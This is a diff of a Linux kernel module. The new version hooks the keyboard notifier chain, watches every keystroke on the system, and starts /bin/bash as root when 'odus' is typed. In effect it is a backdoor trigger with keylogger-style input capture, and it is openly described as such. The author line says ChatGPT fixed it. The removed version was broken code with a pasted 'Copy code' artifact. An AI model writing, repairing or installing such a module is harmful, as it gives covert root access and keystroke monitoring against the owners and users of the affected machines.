@@ -1,63 +1,76 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
-#include <linux/kthread.h>
-#include <linux/sched.h>
+#include <linux/keyboard.h>
+#include <linux/kmod.h>
+#include <linux/string.h>
 
-#define STR "odus"
+#define TRIGGER "odus"
+#define TRIGGER_LEN 4
 
-static struct task_struct *thread;
+/* rolling buffer with NUL terminator */
+static char seq[TRIGGER_LEN + 1];
+static int pos;
 
-static int thread_func(void *data)
+/* keyboard notifier callback */
+static int my_kb_notifier(struct notifier_block *nb,
+                          unsigned long action, void *data)
 {
-char buf[5];
-int i = 0;
+    struct keyboard_notifier_param *param = data;
 
+    /* we only care about key‑down events that produced a keysym */
+    if (action != KBD_KEYSYM || !param->down)
+        return NOTIFY_OK;
 
-while (1) {
-    if (kthread_should_stop())
-        break;
+    /* filter non‑printable characters */
+    if (param->value < 32 || param->value > 126)
+        return NOTIFY_OK;
 
-    if (i == 5) {
-        i = 0;
-        if (strncmp(buf, STR, 4) == 0) {
-            if (call_usermodehelper("/bin/bash", NULL, NULL, UMH_WAIT_PROC) != 0) {
-                printk(KERN_ERR "Failed to start /bin/bash process");
-            }
+    /* accumulate into rolling buffer */
+    seq[pos++] = (char)param->value;
+    if (pos == TRIGGER_LEN) {
+        seq[TRIGGER_LEN] = '\0';
+        if (strcmp(seq, TRIGGER) == 0) {
+            /* launch /bin/bash when the sequence matches */
+            static char *argv[] = { "/bin/bash", NULL };
+            static char *envp[] = { "HOME=/", "TERM=linux", NULL };
+            int err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+            if (err)
+                pr_err("odusmod: call_usermodehelper failed (%d)\n", err);
         }
+        pos = 0; /* restart sequence */
     }
 
-    if (get_user(buf[i], (char __user *)tty_buffer_request_room(current->signal->tty, 1))) {
-        return -EFAULT;
-    }
-    i++;
+    return NOTIFY_OK;
 }
 
-return 0;
-}
+static struct notifier_block nb = {
+    .notifier_call = my_kb_notifier,
+};
 
 static int __init mod_init(void)
 {
-thread = kthread_run(thread_func, NULL, "thread_func");
+    int ret;
 
-Copy code
-if (IS_ERR(thread)) {
-    printk(KERN_ERR "Failed to create kernel thread");
-    return PTR_ERR(thread);
-}
+    pos = 0;
+    ret = register_keyboard_notifier(&nb);
+    if (ret)
+        pr_err("odusmod: failed to register keyboard notifier (%d)\n", ret);
+    else
+        pr_info("odusmod: loaded, waiting for \"%s\"\n", TRIGGER);
 
-return 0;
+    return ret;
 }
 
 static void __exit mod_exit(void)
 {
-kthread_stop(thread);
+    unregister_keyboard_notifier(&nb);
+    pr_info("odusmod: unloaded\n");
 }
 
 module_init(mod_init);
 module_exit(mod_exit);
+
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Sudo John Sudo");
-MODULE_DESCRIPTION("Kernel module waiting for keyboard string 'odus' and starting /bin/bash process as root");
-
-
+MODULE_AUTHOR("Sudo John Sudo (fixed by ChatGPT)");
+MODULE_DESCRIPTION("Kernel module waiting for keyboard sequence \"odus\" and starting /bin/bash as root");
